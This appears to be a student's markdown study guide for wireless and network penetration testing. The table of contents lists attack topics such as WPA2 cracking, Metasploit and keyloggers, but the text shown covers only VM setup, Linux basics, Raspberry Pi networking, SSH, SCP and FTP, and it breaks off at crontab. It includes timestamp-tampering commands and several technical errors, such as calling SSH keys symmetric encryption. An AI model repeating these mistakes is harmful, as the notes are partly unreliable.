# Wireless and Basic Network Penetration Guide

This document contains detailed theory, concepts, and other information related to Wireless Enumeration that isn't as easy to navigate quickly. It serves as the general repository and documentation for Wireless Enumeration information.

- [Wireless and Basic Network Penetration Guide](#wireless-and-basic-network-penetration-guide)
- [(1) Virtualization, Linux Fundamentals, and Encryption](#1-virtualization-linux-fundamentals-and-encryption)
  - [Virtualization](#virtualization)
    - [Virtualization Terminology](#virtualization-terminology)
    - [Hypervisor Types](#hypervisor-types)
    - [VM Networking](#vm-networking)
    - [Calculating VMs](#calculating-vms)
    - [VM Creation Steps](#vm-creation-steps)
  - [VM Settings and Setup](#vm-settings-and-setup)
    - [VMWare Fusion Tools (Mounting a Shared Folder)](#vmware-fusion-tools-mounting-a-shared-folder)
    - [Enabling Persistent HGFS (Enabling Persistent Shared Folders)](#enabling-persistent-hgfs-enabling-persistent-shared-folders)
    - [Creating a Link (from /mnt to Home Directory)](#creating-a-link-from-mnt-to-home-directory)
    - [Making Bootable Media into USB via Terminal](#making-bootable-media-into-usb-via-terminal)
  - [Linux Fundamentals](#linux-fundamentals)
    - [Monitoring Linux Distributions](#monitoring-linux-distributions)
    - [File Structure](#file-structure)
    - [User Identification (UID) Structure](#user-identification-uid-structure)
    - [Basic System Information Commands](#basic-system-information-commands)
    - [File and Directory Manipulation Commands](#file-and-directory-manipulation-commands)
    - [Persistence Techniques](#persistence-techniques)
  - [Persistence Techniques - CRONTAB](#persistence-techniques---crontab)
  - [Permission Structure](#permission-structure)
  - [Special File Permissions](#special-file-permissions)
  - [Subnetting (IPv4)](#subnetting-ipv4)
    - [Identifying Network IDs](#identifying-network-ids)
  - [IPv6](#ipv6)
    - [IPv6 Address Recognition](#ipv6-address-recognition)
    - [Special Addresses for IPv6](#special-addresses-for-ipv6)
  - [Address Resolution Protocol (ARP)](#address-resolution-protocol-arp)
  - [Additional Linux Commands (Post-Enumeration/Analysis)](#additional-linux-commands-post-enumerationanalysis)
- [(2) RasPi Introduction, VPN Basics, and Encryption](#2-raspi-introduction-vpn-basics-and-encryption)
    - [RaspberryPi Configuration](#raspberrypi-configuration)
    - [Displaying Wireless Interface on RPI](#displaying-wireless-interface-on-rpi)
    - [Showing Connection Status](#showing-connection-status)
    - [Creating a Passphrase and Password for WPA](#creating-a-passphrase-and-password-for-wpa)
    - [Taking the Created Passphrase and Building a WPA Conf File](#taking-the-created-passphrase-and-building-a-wpa-conf-file)
  - [Secure Shell and Working with SSH (Rasp PI \> VM)](#secure-shell-and-working-with-ssh-rasp-pi--vm)
    - [STARTING SERVICES](#starting-services)
    - [SSH Port # Configuration](#ssh-port--configuration)
    - [TERMINATOR TIPS AND TRICKS](#terminator-tips-and-tricks)
    - [SSH Keys](#ssh-keys)
      - [Building SSH Keys](#building-ssh-keys)
  - [Secure Copy (SCP)](#secure-copy-scp)
    - [To SCP Over a Non-Standard Port](#to-scp-over-a-non-standard-port)
  - [FTP](#ftp)
    - [Modify FTP to vsftpd file Server](#modify-ftp-to-vsftpd-file-server)
    - [Changing vsftpd.conf FTP port to a non-standard port](#changing-vsftpdconf-ftp-port-to-a-non-standard-port)
  - [Camera Access with Selfies (on RasPI ONLY)](#camera-access-with-selfies-on-raspi-only)
  - [Cron Tab via Raspberry Pi](#cron-tab-via-raspberry-pi)
  - [FIREWALLS](#firewalls)
    - [FIREWALL BASICS](#firewall-basics)
    - [LINUX FIREWALLS](#linux-firewalls)
  - [VPC CREATION](#vpc-creation)
  - [Virtual Private Servers (VPSs)](#virtual-private-servers-vpss)
  - [Wireguard \& OpenVPN](#wireguard--openvpn)
    - [VPN Basics](#vpn-basics)
    - [OpenVPN](#openvpn)
    - [Wireguard (BEST VPN CHOICE)](#wireguard-best-vpn-choice)
  - [TUNNELING](#tunneling)
    - [REMOTE PI](#remote-pi)
    - [HOME LOCATION](#home-location)
    - [HOME LOCATION + CLOUD](#home-location--cloud)
  - [RPI-AP-Setup](#rpi-ap-setup)
    - [RaspberryPI Projects](#raspberrypi-projects)
  - [ENCRYPTION STANDARDS](#encryption-standards)
    - [HEX ENCODE](#hex-encode)
    - [HEX DECODE](#hex-decode)
    - [BASE64](#base64)
    - [QR CODE GENERATION](#qr-code-generation)
    - [DECODING QR IMAGE](#decoding-qr-image)
    - [hURL](#hurl)
  - [ENCRYPTION OF FILES](#encryption-of-files)
    - [ENCRYPT](#encrypt)
    - [DECRYPT](#decrypt)
  - [COMPRESSION USING 7ZIP](#compression-using-7zip)
    - [Download 7zip](#download-7zip)
    - [7z a -mhe=on archive.7z -p message.txt - puts message into a pass protected 7z archive](#7z-a--mheon-archive7z--p-messagetxt---puts-message-into-a-pass-protected-7z-archive)
    - [EXTRACTING USING 7ZIP](#extracting-using-7zip)
  - [STEGANOGRAPHY](#steganography)
    - [EMBEDDING STEG](#embedding-steg)
    - [FORENSICS](#forensics)
    - [EXTRACTIVE STEG](#extractive-steg)
  - [Phase I](#phase-i)
    - [ENCODE](#encode)
    - [ENCRYPT](#encrypt-1)
    - [ARCHIVE](#archive)
    - [EMBED](#embed)
  - [Phase II](#phase-ii)
    - [SEND](#send)
    - [EXTRACTv1](#extractv1)
    - [EXTRACTv2](#extractv2)
    - [DECRYPT](#decrypt-1)
    - [DECODE](#decode)
- [(3) RF Theory, Wireless Attack, and Wireshark](#3-rf-theory-wireless-attack-and-wireshark)
    - [RF MATH](#rf-math)
  - [WLAN THEORY](#wlan-theory)
  - [Attacking Wireless Systems](#attacking-wireless-systems)
    - [AIRMON-NG](#airmon-ng)
    - [Living Off the Land Essential Commands](#living-off-the-land-essential-commands)
    - [Commands for Non-Native Packages](#commands-for-non-native-packages)
      - [Monitor Mode (ip link)](#monitor-mode-ip-link)
      - [Monitor Mode (ifconfig)](#monitor-mode-ifconfig)
    - [AIRODUMP-NG OPTIONS](#airodump-ng-options)
    - [airgraph-ng Setup and Usage](#airgraph-ng-setup-and-usage)
    - [==KISMET \[DIGITAL TERRAIN MAPPING (DTM) or SURVEYING\] ==](#kismet-digital-terrain-mapping-dtm-or-surveying-)
    - [KISMET TROUBLESHOOTING](#kismet-troubleshooting)
    - [KISTMET KML FILE](#kistmet-kml-file)
    - [KISMET PCAP-NG](#kismet-pcap-ng)
  - [WIRESHARK FORMATING](#wireshark-formating)
    - [WIRESHARK FILTERS](#wireshark-filters)
    - [WIRESHARK DECRYPTION](#wireshark-decryption)
    - [Interesting Streams](#interesting-streams)
    - [EXPORT OBJECTS](#export-objects)
    - [WIRESHARK FILTERS](#wireshark-filters-1)
    - [PCAP CARVING](#pcap-carving)
    - [GENERAL FILTERS](#general-filters)
      - [CHAINING FILTERS](#chaining-filters)
    - [FRAME INFO](#frame-info)
  - [BLUETOOTH](#bluetooth)
    - [BLUE HYDRA](#blue-hydra)
    - [POST-OP (BLUE HYDRA)](#post-op-blue-hydra)
    - [BLUE\_SONAR](#blue_sonar)
    - [USEFUL INFORMATION](#useful-information)
  - [TSHARK](#tshark)
    - [FETCH FILTERING (CAPTURE ONLY)](#fetch-filtering-capture-only)
    - [YANK FILTERING (DISPLAY FILTERING)](#yank-filtering-display-filtering)
    - [OUTPUT FORMATTING](#output-formatting)
  - [MERGECAP](#mergecap)
  - [EDITCAP](#editcap)
  - [AIRDECAP-NG](#airdecap-ng)
    - [WPA/2](#wpa2)
    - [WEP](#wep)
  - [MAC ADDRESS SPOOFING](#mac-address-spoofing)
    - [SPOOFING (LIVING OFF THE LAND)](#spoofing-living-off-the-land)
    - [MAC CHANGER (VIA REVERSE AND USING PROXY CHAINS ON NATIVE SYSTEM)](#mac-changer-via-reverse-and-using-proxy-chains-on-native-system)
    - [MAC ADDRESS PERSISTENCE](#mac-address-persistence)
  - [ANDROID](#android)
    - [Android Version 6.x](#android-version-6x)
    - [Android Version 8.1.x](#android-version-81x)
  - [DISCOVERY COMMANDS](#discovery-commands)
- [(4) Wireless Authentication and Password Cracking](#4-wireless-authentication-and-password-cracking)
  - [Wireless Security Standards](#wireless-security-standards)
  - [Deauthentication Attack](#deauthentication-attack)
  - [Cracking WPA2](#cracking-wpa2)
    - [Airmon Setup](#airmon-setup)
    - [Target Discovery](#target-discovery)
    - [Target Collection](#target-collection)
    - [Passive Handshake Collection](#passive-handshake-collection)
    - [Active Handshake Collection](#active-handshake-collection)
    - [Deauthentication Attack for Handshake Collection](#deauthentication-attack-for-handshake-collection)
    - [Verify the Handshake](#verify-the-handshake)
    - [Handshake Troubleshooting](#handshake-troubleshooting)
    - [Handshake Cracking](#handshake-cracking)
      - [Tshark](#tshark-1)
      - [Aircrack-ng](#aircrack-ng)
  - [Stripping Encryption from PCAP](#stripping-encryption-from-pcap)
  - [Wireshark Decryption](#wireshark-decryption-1)
  - [WLAN Connection via CLI](#wlan-connection-via-cli)
    - [Adding WAP Credentials](#adding-wap-credentials)
    - [Connecting the Adapter](#connecting-the-adapter)
    - [Obtaining IP Address](#obtaining-ip-address)
    - [Verifying Connection](#verifying-connection)
    - [WLAN Disconnection](#wlan-disconnection)
    - [Removing Old WPA Supplicant Configuration](#removing-old-wpa-supplicant-configuration)
  - [Defeating WEP](#defeating-wep)
    - [Discovering Target Network](#discovering-target-network)
    - [Collecting Initialization Vectors (IVs)](#collecting-initialization-vectors-ivs)
      - [Passive IV Collection](#passive-iv-collection)
      - [Active IV Collection](#active-iv-collection)
      - [Using Four Windows for Active Collection](#using-four-windows-for-active-collection)
    - [Supplicant Files for WEP](#supplicant-files-for-wep)
      - [Adding WEP Credentials](#adding-wep-credentials)
    - [For Open WEP Credentials](#for-open-wep-credentials)
    - [Connecting the Adapter](#connecting-the-adapter-1)
  - [Hashcat](#hashcat)
  - [Identifying Hash](#identifying-hash)
  - [File Locations of Interest](#file-locations-of-interest)
  - [Hashcat Rules](#hashcat-rules)
    - [Using Specific Rule File](#using-specific-rule-file)
    - [Using a Single Line Rule](#using-a-single-line-rule)
    - [Single Line Rules Reference](#single-line-rules-reference)
    - [Custom Rule Creation](#custom-rule-creation)
    - [Mangling and Sorting Word Lists](#mangling-and-sorting-word-lists)
    - [Combination Attack (-a1)](#combination-attack--a1)
    - [Brute Force Attack (-a3)](#brute-force-attack--a3)
    - [Pre-configured Brute Force Masks](#pre-configured-brute-force-masks)
    - [Hybrid Attack](#hybrid-attack)
    - [Append Attack](#append-attack)
    - [Prepend Attack](#prepend-attack)
    - [Hashcat with WPA Passwords](#hashcat-with-wpa-passwords)
    - [Capturing WPA Handshake](#capturing-wpa-handshake)
    - [Converting Capture File to Hashcat Format](#converting-capture-file-to-hashcat-format)
    - [Hydra](#hydra)
  - [Custom Wordlist Generator (CeWL)](#custom-wordlist-generator-cewl)
  - [Wordlist Trimming](#wordlist-trimming)
  - [Crunch](#crunch)
  - [MDK4](#mdk4)
  - [PMKID Attacks](#pmkid-attacks)
  - [HCXDUMPTOOL](#hcxdumptool)
  - [HCXPCAPNGTOOL](#hcxpcapngtool)
  - [Cracking WPA Handshakes from HCXTOOLs](#cracking-wpa-handshakes-from-hcxtools)
  - [WPA Rainbow Tables Example](#wpa-rainbow-tables-example)
  - [Trimming Wordlist](#trimming-wordlist)
  - [Creating Rainbow Table with GenPMK](#creating-rainbow-table-with-genpmk)
  - [Cracking .PCAP with Cowpatty](#cracking-pcap-with-cowpatty)
  - [John the Ripper](#john-the-ripper)
    - [Installation](#installation)
    - [Scripts for John](#scripts-for-john)
    - [Basic Usage](#basic-usage)
    - [Cracking Encrypted Files](#cracking-encrypted-files)
      - [Decrypting Files Using John](#decrypting-files-using-john)
      - [Cracking 7z Files](#cracking-7z-files)
      - [Cracking PDF Files](#cracking-pdf-files)
  - [WPS Attacks](#wps-attacks)
  - [On Path Attack (Man-in-the-Middle)](#on-path-attack-man-in-the-middle)
  - [ARP Poisoning](#arp-poisoning)
  - [Ettercap](#ettercap)
    - [Installation](#installation-1)
      - [GUI Steps](#gui-steps)
      - [Terminal Steps](#terminal-steps)
- [(5) Basic Attacker Frameworks and Logical/Physical Penetration Testing](#5-basic-attacker-frameworks-and-logicalphysical-penetration-testing)
  - [Basic Web Application Penetration Testing Example SOP](#basic-web-application-penetration-testing-example-sop)
    - [Browse the Site Manually](#browse-the-site-manually)
    - [Fingerprint Web Server](#fingerprint-web-server)
  - [Recon III (Common Services)](#recon-iii-common-services)
  - [Recon IV (Research Exploits via ExploitDB)](#recon-iv-research-exploits-via-exploitdb)
  - [Recon V (Gathering Results)](#recon-v-gathering-results)
  - [Online Resources](#online-resources)
  - [Weaponization Stages](#weaponization-stages)
  - [Docker Playgrounds](#docker-playgrounds)
    - [Docker: Damn Vulnerable Web Application (DVWA) Playground](#docker-damn-vulnerable-web-application-dvwa-playground)
    - [Exporting](#exporting)
      - [From Metasploit (Exploit Selection)](#from-metasploit-exploit-selection)
      - [Configuring the Exploit](#configuring-the-exploit)
  - [Creating Bash Shell Within Session](#creating-bash-shell-within-session)
  - [Veil](#veil)
  - [Shellter](#shellter)
  - [Post Exploitation](#post-exploitation)
    - [Situation Awareness](#situation-awareness)
      - [Getting System Information (Windows)](#getting-system-information-windows)
      - [Running As? (Linux)](#running-as-linux)
      - [Running As? (Meterpreter)](#running-as-meterpreter)
    - [Processes? (Unix)](#processes-unix)
  - [PrivEsc via Metasploit (Meterpreter)](#privesc-via-metasploit-meterpreter)
    - [If Getsystem Fails](#if-getsystem-fails)
  - [Privilege Escalation via PEASS-NG (Metasploit)](#privilege-escalation-via-peass-ng-metasploit)
    - [Using peass-ng](#using-peass-ng)
    - [Incognito (Tokens)](#incognito-tokens)
  - [Screen Shot/Web Cam (Meterpreter)](#screen-shotweb-cam-meterpreter)
    - [Screenshot](#screenshot)
    - [Webcam](#webcam)
  - [Search for Content](#search-for-content)
  - [Keylogger](#keylogger)
  - [Timestomp](#timestomp)
    - [From Target](#from-target)
    - [File Transfer - Netcat](#file-transfer---netcat)
      - [From Target](#from-target-1)
      - [From Kali](#from-kali)
    - [File Transfer - Certutil](#file-transfer---certutil)
      - [From Kali](#from-kali-1)
    - [File Transfer - FTP](#file-transfer---ftp)
      - [From Kali](#from-kali-2)
  - [PowerShell Empire Basics](#powershell-empire-basics)
    - [Setup](#setup)
    - [Listener](#listener)
    - [Stagers](#stagers)
  - [Windows CLI Basics](#windows-cli-basics)
  - [Physical Penetration](#physical-penetration)
    - [Unix/Debian Systems](#unixdebian-systems)
      - [Change Current User Password](#change-current-user-password)
      - [Add a New User](#add-a-new-user)
      - [Reboot](#reboot)
    - [Physical Penetration (Windows)](#physical-penetration-windows)
    - [Easy Button](#easy-button)


# (1) Virtualization, Linux Fundamentals, and Encryption

## Virtualization

### Virtualization Terminology

* **Hypervisor:**
  * The technology that enables virtualization.
  * A hypervisor allows virtual machines to interact with the hardware without going through the host OS.
  * Manages access to CPU, Storage, RAM.
  * Used to load the ISO into!

### Hypervisor Types

* **Type I (Bare Metal):**
  * Sits on top of the bare metal servers and other physical hardware and has direct access to the hardware resources.
  * Also known as a bare metal hypervisor.
  * **THINK:** Utilization of server resources like switches, nodes, etc.

* **Type II (Hosted):**
  * Requires a host operating system to support.
  * Also referred to as a hosted or embedded hypervisor.
  * **THINK:** II is you, requires a host operating system to support.

### VM Networking

* **Bridged:** A VM resides on the same network as the interface with its own MAC address and IP address (emulates another physical device on the network).
* **NAT (Network Address Translation):** A VM ‘hides’ behind the host system’s IP address; any traffic from the VM will appear as if it's coming from the host IP.
* **Host Only:** All network traffic stays internal to the host.

### Calculating VMs

* **General Rule:**
  * **Non-Hypervisor:** 4 VMs to 1 CPU Core (e.g., 4 CPUs = 16 VMs)
  * **Hypervisor:** Doubles the CPU cores (e.g., 1 CPU -> 2 CPU cores)

### VM Creation Steps

1. **New VM > Create a Custom VM > Choose OS > UEFI > Create a new virtual disk > Customize Settings > Save**
2. **CPU & Memory:** 2 processor core
3. **Hard Drive:** 60 GB
4. **Display:** Accelerate 3D Graphics
5. **Network:** Connect Network Adapter
6. **Connect CD/DVD Drive > Autodetect**

## VM Settings and Setup

### VMWare Fusion Tools (Mounting a Shared Folder)

* **Rule of Thumb - ALWAYS UPDATE**

    ```bash
    sudo apt update
    ```

* Install VMware Tools:

    ```bash
    sudo apt install open-vm-tools-desktop
    ```

  * Enables sharing with the host machine.
* Create Mount Point:

    ```bash
    cd /mnt
    sudo mkdir hgfs
    ```

  * Making a `hgfs` folder inside of `/mnt` (this will be the location of our shared documents).
* Mount Shared Folder:

    ```bash
    sudo /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other
    ```

  * The following enables us to mount shared files between our host machine and our virtual machine!
  * **RESTART VM AND PROCEED TO NEXT STEP**

**`VM-tools-install.sh` for Automated Script!**

**NOTE:** When setting up 64-bit applications, the minimum specs are as follows: (2 CPU, 2 GB of RAM, 20 GB of Storage).

### Enabling Persistent HGFS (Enabling Persistent Shared Folders)

```bash
sudo nano /etc/fstab
```

* **NOTE:** Add the following to the last line of the document (use tabs for spaces):

    ```bash
    vmhgfs-fuse    /mnt/hgfs    fuse    defaults,allow_other    0    0
    ```

### Creating a Link (from /mnt to Home Directory)

```bash
ln -s /mnt/hgfs ~/Desktop/MACHOST
```

* Allows you to create a pointer/shortcut to the location of where you want to place your files.

### Making Bootable Media into USB via Terminal

```bash
lsblk
```

* List information about all available or specified block devices.

```bash
cd /mnt/hgfs/Desktop/Important\ Documents/ISOs
sudo dd if=<specific ISO image that we want to copy over> of=/dev/sbd bs=100M status=progress
```

## Linux Fundamentals

### Monitoring Linux Distributions

* [Distro Watch](https://distrowatch.com/)

### File Structure

* `/bin`: Common programs (includes all binaries loaded on the system for applications to run; only certain users are allowed to run commands placed here).
* `/boot`: Boot files.
* `/etc`: Configuration files.
* `/home`: User home directories.
* `/lib`: Shared libraries.
* `/media`: Directory for external device mounts.
* `/mnt`: Old directory for external device mounts.
* `/opt`: Optional software.
* `/proc`: Virtual directory used by the kernel for process management.
* `/root`: Root user’s home directory.
* `/sbin`: Shared binary files (meaning any user on the box can utilize information here **THINK:** `curl`, `ls`, etc.).
* `/selinux`: SELinux specific files.
* `/srv`: System services files.
* `/sys`: Virtual directory used by the kernel for data structures.
* `/tmp`: Temporary directory.
* `/usr`: Read-only user-specific files and binaries.
* `/var`: Variable files including logs and printer spool.
* `/usr/bin` or `/bin`: Location of most commonly used commands.
* `/usr/sbin`: Another location for command binaries.
* `/var/log`: Log files location.
* `/var/www`: Location of Apache web server when installed.
* `/tmp`: Often used to share files amongst users.
* `/etc`: Most daemon configuration files are found here.
* `/etc/ssh`: Location of SSH configuration files.

### User Identification (UID) Structure

* **NOTE:** A good way to determine whether or not what you see is a service vs. user account (from `/etc/passwd`):

    ```bash
    username:<password (x)>:UID:GID:User ID Info (GECOS Field):Home dir
    ```

    1. UID 0 = root
    2. UID 1-99 = reserved for other predefined accounts
    3. UID 100-999 = reserved by the system for admin accounts/groups
    4. User accounts begin at 1000
    5. Service accounts are below 1000
* [User ID (UID) Structure](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)

### Basic System Information Commands

1. **Display file information:**

    ```bash
    stat <file>
    ```

2. **Provide brief command descriptions:**

    ```bash
    apropos <command>
    ```

3. **Identify OS version:**

    ```bash
    cat /etc/*release*
    ```

4. **Display system information:**

    ```bash
    uname -a
    ```

5. **Show system uptime:**

    ```bash
    uptime
    ```

6. **Display LSB information:**

    ```bash
    lsb_release -a
    ```

7. **Show kernel version:**

    ```bash
    cat /proc/version
    ```

8. **Display current date and time:**

    ```bash
    date
    ```

9. **Display system uptime (again):**

    ```bash
    uptime
    ```

10. **Display user and group IDs:**

    ```bash
    id
    ```

11. **Display network configuration:**

    ```bash
    ifconfig
    ```

12. **Display wireless interface configuration:**

    ```bash
    iwconfig
    ```

13. **Display IP addresses:**

    ```bash
    hostname -I
    ```

14. **Request a new IP address:**

    ```bash
    sudo dhclient <interface>
    ```

### File and Directory Manipulation Commands

1. **Find hidden files:**

    ```bash
    find / -name *hidden* 2>/dev/null
    ```

2. **Display CPU details:**

    ```bash
    cat /proc/cpuinfo
    ```

3. **Display RAM details:**

    ```bash
    cat /proc/meminfo
    ```

4. **List USB devices:**

    ```bash
    lsusb
    ```

5. **List PCI hardware:**

    ```bash
    lspci
    ```

6. **Display disk information:**

    ```bash
    mount
    ```

7. **Display disk space usage:**

    ```bash
    df
    ```

8. **Display memory usage:**

    ```bash
    free
    ```

9. **Display disk usage of a directory:**

    ```bash
    du
    ```

10. **Change file permissions (user):**

    ```bash
    chmod u+<r/w/x> <file>
    ```

11. **Add a new user:**

    ```bash
    useradd -m <username>
    ```

12. **Set user password:**

    ```bash
    passwd <username>
    ```

13. **Add user to sudo group:**

    ```bash
    usermod -aG sudo <username>
    ```

14. **Display information about system users:**

    ```bash
    finger <username>
    ```

15. **Display running processes:**

    ```bash
    ps aux
    ```

16. **Monitor command output periodically:**

    ```bash
    watch -n <seconds> -d <command>
    ```

### Persistence Techniques

1. **Change hostname:**

    ```bash
    hostname <new_hostname>
    sudo nano /etc/hosts
    ```

    * Alter the loopback address to match the hostname you've created.

## Persistence Techniques - CRONTAB

* [Crontab Guru](https://crontab.guru/)
* **Edit cron jobs:**

    ```bash
    crontab -e
    ```

**NOTE:** To specify a specific time, use the following (`*/#`) - use before the specific number you'd like to schedule for (e.g., `*/3 * * * *` = repeating a task every three minutes).

## Permission Structure

* `r` (read): 4
* `w` (write): 2
* `x` (execute): 1

```bash
User/Owner: rwx = 4+2+1 = 7
Group: r-- = 4+0+0 = 4
Others: r-- = 4+0+0 = 4
```

## Special File Permissions

* [Special File Permissions](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit)

1. **Set USER ID (SUID):** Allows normal users to run a script or program as the owner of that file.
    * There will be an ‘s’ in the owner’s permissions for the file: `<-rwSrwxr-x>`

2. **Set GROUP ID (SGID):**
    * An ‘s’ will be located in the group’s permissions for the file: `<drwxrwSr-x>`

3. **Sticky Bit:**
    * A "t" or "T" will be located in the other’s permissions for the file: `<drwxrwxr-t>` OR `<drwxrwx--T>`

## Subnetting (IPv4)

### Identifying Network IDs

* **Example 1:**
  * IP = 192.168.9.100
  * Subnet Mask = 255.255.255.0
  * **Network ID = 192.168.9.0**
  * **Broadcast Address = 192.168.9.255**

* **Example 2:**
  * IP = 192.168.9.100
  * Subnet Mask = 255.255.0.0
  * **Network ID = 192.168.0.0**
  * **Broadcast Address = 192.168.255.255**

## IPv6

### IPv6 Address Recognition

1. `::`: Used to replace sections of zeros.
2. IPv6 addresses should have leading zeros.
3. IPv6 should have 8 octets.
4. IPv6 follows hexadecimal rules.
5. Only one "::" per IP address.

* **Example:**
  * `2001:0db8:0000:0000:0000:ff00:0042:8329`
  * `2001:db8:0:0:0:ff00:42:8329`
  * `2001:db8::ff00:42:8329`

### Special Addresses for IPv6

* **Loopback IPv6 address:**
  * `::1`

* **Multicast Addresses for IPv6:**
  * `ff0x`: Multicast prefix.
  * `ff02::1`: All nodes on a link.
  * `ff02::2`: All routers on a link.
  * `ff02::1:2`: All DHCP servers on a link.
  * `ff0x::101`: Network Time Protocol (NTP).

* **Address Types:**
  * Link-local: `FE80::/10`
  * Global Unicast: `2000::/3`

## Address Resolution Protocol (ARP)

1. Layer 2/3 function: IP to MAC address translation.
2. **Process:** Broadcast Request > Unicast Response
    1. **Request:** Who has \[XX IP address]?
    2. **Response:** I have that IP, this is my MAC address.
3. **DESTINATION MAC ADDRESS (ARP Request):**
    1. `FF:FF:FF:FF:FF:FF`

## Additional Linux Commands (Post-Enumeration/Analysis)

1. **See DNS server:**

    ```bash
    resolvectl
    ```

2. **Disable automatic NTP:**

    ```bash
    sudo timedatectl set-ntp false
    ```

3. **Set manual system time:**

    ```bash
    sudo timedatectl set-time <hh:mm:ss>
    ```

4. **Modify file timestamp:**

    ```bash
    touch -t YYMMDDHHMM <file.txt>
    ```

5. **Output file in reverse:**

    ```bash
    tac <file.txt>
    ```

6. **Display common ports and protocols:**

    ```bash
    more /etc/services
    ```

7. **Display readable strings in a file:**

    ```bash
    strings /usr/bin/passwd
    ```

8. **Follow file updates:**

    ```bash
    tail -f <file.txt>
    ```

9. **Find command locations:**

    ```bash
    which -a <command>
    ```

# (2) RasPi Introduction, VPN Basics, and Encryption

Via Raspberry Pi Imager rather than `dd` via CMD line - is useful because it allows you to download updates

1. Raspberry Pi Imager > Use Custom > Locate Raspberry Pi ISO
2. Choose Storage > Next > Write > Yes > Wait for installation to complete and remove SD card!
    1. NOTE: red = power is being used, green = successfully reading from the SD card

### RaspberryPi Configuration

1.

    ```bash
    sudo raspi-config
    ```

### Displaying Wireless Interface on RPI

1.

    ```bash
    iw dev
    ```

2. **Verify wireless network interface:**

    ```bash
    iwconfig
    ```

    1. **Shut down wireless interface:**

        ```bash
        sudo iwconfig wlan0 down
        ```

3. **Scan for network devices:**

    ```bash
    sudo iw dev wlan0 scan | grep "XXX"
    ```

### Showing Connection Status

1.

    ```bash
    ip link show <wlan#>
    ```

2.

    ```bash
    ip a
    ```

### Creating a Passphrase and Password for WPA

1. **Configure pre-shared key:**

    ```bash
    sudo wpa_passphrase 'SSID' 'password'
    ```

### Taking the Created Passphrase and Building a WPA Conf File

1.

    ```bash
    sudo wpa_passphrase 'SSID' 'password' >> /etc/wpa_supplicant/wpa_supplicant.conf
    ```

2. **Verify configuration file:**

    ```bash
    sudo nano wpa_passphrase 'SSID' 'password' >> /etc/wpa_supplicant/wpa_supplicant.conf
    ```

    1. HIDDEN SSID: `scan_ssid=1`
        ![[Hidden SSID.png]]

4. Creating background for the connection to WPA Supplicant
    1. NOTE: BE SURE TO RE-RUN THIS COMMAND IF YOU POWER OFF YOUR RPI!
    2.

        ```bash
        sudo wpa_supplicant -B -c /etc/wpa_supp/wpa_supp.conf/ -i <interface (wlan0)>
        ```

        1. `-B`: Background activating persistence for the system
        2. `-i`: specify the interface
        3. `-c`: specifying the configuration file you want to access

    2.

        ```bash
        watch iwconfig
        ```

        1. **NOTE:** if successful you will see "Successfully initialized wpa_supplicant"

    4. **TROUBLESHOOTING**:
        1.
            ```bash
            sudo rm -r /var/run/wpa_supplicant/wlan0
            ```
        2.
            ```bash
            ps aux | grep wpa
            ```
        3.
            ```bash
            sudo kill -9 <wpa processes>
            ```

1.

    ```bash
    route -n
    ```

    1. `chromium-browser <gateway IP>` OR connect using your MAC
2. `chown`
3. `ifconfig`
4. `dhclient`
5. `wpa_cli`

## Secure Shell and Working with SSH (Rasp PI > VM)

### STARTING SERVICES

1.

    ```bash
    systemctl status <service>
    ```

2.

    ```bash
    sudo apt install <service>
    ```

3.

    ```bash
    sudo systemctl start <service>
    ```

4.

    ```bash
    sudo systemctl enable <service>
    ```

    1.

        ```bash
        sudo nestat -antlp
        ```

5.

    ```bash
    sudo systemctl restart <service>
    ```

6.

    ```bash
    ifconfig wlan0
    ```

### SSH Port # Configuration

SSH Port # Path: `/etc/ssh/sshd_config`

1.

    ```bash
    sudo nano /etc/ssh/sshd_config
    ```

2.

    ```bash
    sudo systemctl restart <service>
    ```

3.

    ```bash
    sudo systemctl status <service>
    ```

### TERMINATOR TIPS AND TRICKS

1. ctrl+shift+O - horizontally
2. ctrl+shift+E - vertically
3. alt+arrow key - move from window to window in terminator

### SSH Keys

1. CAC = Hardware token (What you have)
2. SSH Key = Software Token (What you have)
3. Types of Keys Supported by SSH:
    2.  Digital Signature Algorithm (DSA) - considered insecure (only supported for REALLY old computer support)
    3.  Rivest Shamir Adleman (RSA) - Older, but still secure if you use longer key lengths (>2048)
    4.  ECDSA - Elliptic Curve Digital Signature Algorithm
    5.  ED25519 - Edward’s curve 25519, current state of the art
    6.  CAC uses RSA-2048 or ECDSA-256

#### Building SSH Keys

Located in /home/user/.ssh (WILL ONLY NEED TO BE RAN ONCE)

1.

    ```bash
    ssh-keygen -t rsa -b 4096
    ```

**NOTE:** generates id_rsa, id_rsa.pub inside of the .ssh folder

* -t = type of key (RSD, ECDSA, etc.)
* -b = bit size

2.

    ```bash
    ssh-copy-id user@server_IP
    ```

* This can be ran on multiple devices
* Takes my public key that I've created and transfers it over to my target THIS ALLOWS YOU ACCESS USING YOUR PRIVATE KEY

**THINK:** Symmetric Encryption (I can access anything that has my public key with my private key)

* -i = allows you specify which id you like to configure

## Secure Copy (SCP)

**PULL:**

```bash
scp user@192.168.1.34:/home/user/Desktop/file.txt .
```

**OR**

```bash
scp <xx@ip-address>:/location/of/file /where/you/want/to/place/file
```

**PUSH:**

```bash
scp file2.txt user@192.168.1.100:/home/user/Desktop/RasPi
```

**OR**

**PUSH:**

```bash
scp <file_to_send.txt> <xx@ip-address>:/location/to/place/file` – used to push files from your location to another
```

### To SCP Over a Non-Standard Port

```bash
scp -P <port#>
```

* `-P` = used to specify a nonstandard port!

## FTP

1.

    ```bash
    systemctl status vsftpd
    ```

2.

    ```bash
    sudo apt install vsftpd
    ```

3.

    ```bash
    sudo systemctl enable vsftpd
    ```

### Modify FTP to vsftpd file Server

* #VSFTP-PATH - /etc/vsftpd.conf

1.

    ```bash
    sudo nano /etc/vsftpd.conf
    ```

2. Uncomment "write_enable=YES" - enables you to pull down files with this enabled!
3.

    ```bash
    sudo systemctl restart vsftpd
    ```

4.

    ```bash
    ftp <ip address>
    ```

    1. `> get file.txt` - used to pull down files and place them in your current directory that you ftp'd in from
    2. `put file.txt` - used to push your target to RasPi

### Changing vsftpd.conf FTP port to a non-standard port

1. Alter the following in nano file:
    1. `listen_port=2136`
2.

    ```bash
    sudo systemctl restart vsftpd
    ```

3.

    ```bash
    sudo netstat -antlp
    ```

4.

    ```bash
    ftp <ip address> -p <port#>`
    ```

## Camera Access with Selfies (on RasPI ONLY)

1.

    ```bash
    libcamera-jpeg -o selif.jpg
    ```

    1. `-o` = output of where the camera will store its contents

## Cron Tab via Raspberry Pi

1.

    ```bash
